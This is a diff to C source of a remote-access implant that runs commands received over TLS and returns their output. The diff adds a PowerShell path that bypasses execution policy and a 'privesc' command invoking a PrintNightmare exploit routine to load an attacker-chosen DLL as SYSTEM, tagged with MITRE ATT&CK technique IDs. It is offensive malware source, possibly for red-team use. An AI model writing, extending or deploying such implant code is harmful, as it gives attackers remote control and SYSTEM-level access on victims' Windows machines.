@@ -29,6 +29,7 @@
 #endif
 
 #include "tls.h"
+#include "privesc.h"
 #include <stdio.h>
 #include <string.h>
 
@@ -45,17 +46,17 @@
 #define CMD_SIZE    1024
 #define RETRY_DELAY 5      /* secondes entre les tentatives de reconnexion */
 
-/* Exécute une commande shell et retourne la sortie dans buf (max buf_len-1 octets).
+/* Exécute une commande et retourne la sortie dans buf (max buf_len-1 octets).
  * Retourne la longueur écrite. */
-static int exec_cmd(const char *cmd, char *buf, int buf_len) {
+static int run_pipe(const char *cmdline, char *buf, int buf_len) {
     FILE *fp;
     int   total = 0;
     int   n;
 
 #ifdef _WIN32
-    fp = _popen(cmd, "r");
+    fp = _popen(cmdline, "r");
 #else
-    fp = popen(cmd, "r");
+    fp = popen(cmdline, "r");
 #endif
     if (!fp) {
         const char *err = "[implant] Impossible d'executer la commande\r\n";
@@ -74,6 +75,20 @@ static int exec_cmd(const char *cmd, char *buf, int buf_len) {
 #endif
     buf[total] = '\0';
     return total;
+}
+
+/* cmd.exe — T1059.003 */
+static int exec_cmd(const char *cmd, char *buf, int buf_len) {
+    return run_pipe(cmd, buf, buf_len);
+}
+
+/* PowerShell — T1059.001 */
+static int exec_ps(const char *cmd, char *buf, int buf_len) {
+    char ps_cmd[CMD_SIZE + 128];
+    snprintf(ps_cmd, sizeof(ps_cmd),
+             "powershell.exe -NoProfile -NonInteractive "
+             "-ExecutionPolicy Bypass -Command \"%s\"", cmd);
+    return run_pipe(ps_cmd, buf, buf_len);
 }
 
 int main(void) {
@@ -111,7 +126,45 @@ int main(void) {
                 return 0;
             }
 
-            /* Exécute la commande et envoie la sortie + marqueur de fin. */
+            /* PrintNightmare LPE (T1068) — privesc <dll_path> */
+            if (strncmp(cmd, "privesc ", 8) == 0) {
+                const char *dll = cmd + 8;
+                int rc = privesc_printnightmare(dll);
+                int out_len;
+                if (rc == 0)
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                        "[privesc] success — DLL loaded as SYSTEM\r\n");
+                else if (rc == -1)
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                        "[privesc] error — DLL not found: %s\r\n", dll);
+                else if (rc == -2)
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                        "[privesc] error — UNIDRV.DLL not found in "
+                        "DriverStore\r\n");
+                else
+                    out_len = snprintf(buf, BUFFER_SIZE - 4,
+                        "[privesc] error — AddPrinterDriverExA failed "
+                        "(code %d, spooler patched?)\r\n", rc);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* PowerShell (T1059.001) — ps <commande> */
+            if (strncmp(cmd, "ps ", 3) == 0) {
+                int out_len = exec_ps(cmd + 3, buf, BUFFER_SIZE - 4);
+                buf[out_len]     = '\x00';
+                buf[out_len + 1] = 'E';
+                buf[out_len + 2] = 'N';
+                buf[out_len + 3] = 'D';
+                tls_send(c, buf, out_len + 4);
+                continue;
+            }
+
+            /* cmd.exe (T1059.003) — par défaut */
             int out_len = exec_cmd(cmd, buf, BUFFER_SIZE - 4);
 
             /* Ajoute le marqueur "\x00END" en fin de payload. */
